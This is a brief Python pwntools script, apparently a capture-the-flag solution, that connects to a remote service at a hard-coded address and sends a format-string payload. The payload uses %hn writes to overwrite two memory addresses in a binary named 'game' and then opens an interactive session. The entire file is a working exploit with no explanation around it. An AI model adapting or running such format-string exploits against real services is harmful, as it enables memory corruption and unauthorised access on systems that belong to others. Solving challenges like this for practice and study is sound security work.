# -*- coding: utf-8 -*-
from pwn import *

#context(log_level='debug')

#p = process("./game")
p = remote("111.198.29.45",32823)

#gdb.attach(p,"b * 0x080484a7")
payload = p32(0x0804a048)+p32(0x0804a04a)+"%538d%13$hn"+"%12544d%12$hn"
p.sendline(payload)

p.interactive()

